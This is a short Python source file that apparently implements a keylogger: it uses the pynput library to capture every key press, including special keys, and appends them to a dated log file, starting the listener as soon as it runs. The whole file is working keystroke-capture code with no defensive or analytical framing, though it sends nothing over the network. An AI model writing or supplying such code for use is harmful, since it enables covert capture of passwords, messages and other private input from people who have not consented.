import os
import pynput.keyboard
from datetime import datetime

class KeyLogger:
    def __init__(self):
        self.logger = ""
        self.log_dir = "logs"
        os.makedirs(self.log_dir, exist_ok=True) 
        self.log_file = self.get_log_filename() 

    # File name with date
    def get_log_filename(self):
        timestamp = datetime.now().strftime("%d-%m-%Y")
        return os.path.join(self.log_dir, f"log_{timestamp}.txt")

    # Adds the characters
    def append_log(self, key_strike):
        self.logger += key_strike
        with open(self.log_file, "a+", encoding="utf-8") as file:
            file.write(self.logger)
        self.logger = ""

    # Checks if it is a string or a special key
    def evaluate_keys(self, key):
        try:
            Pressed_key = str(key.char) 
        except AttributeError:
            if key == key.space:
                Pressed_key = " "
            else:
                Pressed_key = f" [{str(key)}] "
        self.append_log(Pressed_key)

    # Starts the keyboard listening process
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            keyboard_listener.join()

KeyLogger().start()